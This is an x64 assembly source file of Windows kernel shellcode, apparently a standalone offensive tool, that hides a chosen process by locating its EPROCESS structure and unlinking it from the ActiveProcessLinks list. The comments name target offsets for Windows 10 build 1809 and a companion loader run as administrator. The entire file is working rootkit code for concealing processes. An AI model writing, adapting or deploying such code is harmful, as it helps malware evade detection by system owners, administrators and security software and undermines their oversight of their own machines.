; By John Stigerwalt
; Process Hide Shellcode for Windows x64 1809
; PID must be inserted or will BSOD
; Run with hideprocessfinal.exe as administrator. Uses this shellcode to hie PID of choice
; 07\30\2019
;



section .text
global start
[BITS 64]

; Save Stack
push rax
push rbx
push rcx
push r9
push r10
push r11
push r12


; Start here
mov r9, qword [gs:188h]
mov r9, qword [r9 + 220h]

; Set registers for loops
mov rbx, r9
mov rax, r9

; jump here to get the 2nd loop ahead of the first one, this will allow us to keep the pervious ActiveProcessLinks pointer
jmp loop2


; First loop to keep track of pervious ActiveProcessLinks
loop1:
mov rbx, qword [rbx + 2e8h] ; +0x2e8 ActiveProcessLinks
mov r11, qword rbx; ActiveProcessLinks Pointer
sub rbx, 2e8h ; Points to EPROCESS of current process

;We jump here first
; Second Loop
loop2:
mov rax, qword [rax + 2e8h] ; +0x2e8 ActiveProcessLinks
mov r10, qword rax
sub rax, 2e8h ; Points to EPROCESS of current process
cmp qword [rax + 2e0h], 1234h  ; +0x2e0 UniqueProcessId  : Ptr64 Void
jne loop1


;After PID is found we must save RAX to be used later so we use RCX
; Current Flink and Blink must point to ActiveProcessLinks RAX-2e8h
mov rcx, qword rax;
mov rcx, qword [rcx + 2e8h] ; +0x2e8 ActiveProcessLinks
mov r12, qword rcx
sub rcx, 2e8h ; Points to EPROCESS of current process


; Overwrite Next Blink with pervious ActiveProcessLink
mov [rcx+2f0h], qword r11

; Overwrite Pervious process FLINK with Next ActiveProcessLink
mov [rbx+2e8h], qword r12

; Overwrite Current Process BLINK and FLINK
mov [rax+2e8h], qword r10 ; Overwrite Current Flink
mov [rax+2f0h], qword r10 ; Overwrite Current Blink

; Fix the stack
pop r12
pop r11
pop r10
pop r9
pop rcx
pop rbx
pop rax


; Return
ret

;find ActiveProcessLink, FLINK, and BLINK
;ActiveProcessLinks for current process: EPROCESS+0x2e8
;FLINK: EPROCESS+[0x2e8]
;BLINK: EPROCESS+[0x2f0]


